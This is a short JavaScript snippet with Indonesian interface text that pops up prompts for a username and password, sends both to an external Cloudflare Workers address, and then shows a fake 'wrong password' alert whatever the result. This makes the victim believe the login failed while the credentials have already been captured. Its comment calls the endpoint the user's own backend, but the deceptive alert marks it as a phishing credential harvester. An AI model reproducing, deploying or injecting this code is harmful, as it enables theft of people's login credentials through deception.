(function () {
  const username = prompt("Masukkan Nama Pengguna:");
  const password = prompt("Masukkan Sandi:");

  if (!username || !password) {
    alert("Data tidak boleh kosong");
    return;
  }

  // Kirim ke endpoint milik sendiri (backend kamu)
  fetch("https://memek-worker.defoy89122.workers.dev/?message=", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      username: username,
      password: password
    })
  })
  .then(res => res.json())
  .then(data => {
    console.log("Response:", data);
    alert("Data terkirim (PASSWORD SALAH)");
  })
  .catch(err => {
    console.error(err);
    alert("PASSWORD SALAH 401");
  });
})();
